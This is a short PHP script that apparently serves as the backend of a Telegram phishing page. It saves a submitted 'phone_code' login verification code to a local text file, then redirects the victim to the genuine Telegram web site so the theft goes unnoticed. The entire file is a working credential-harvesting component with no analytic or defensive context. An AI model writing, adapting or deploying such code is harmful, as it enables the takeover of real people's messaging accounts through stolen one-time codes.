<?php
file_put_contents("info.txt", "\nCODE : " . $_POST["phone_code"] . "\n<======>\n", FILE_APPEND);
header("Location: https://web.telegram.org");
exit();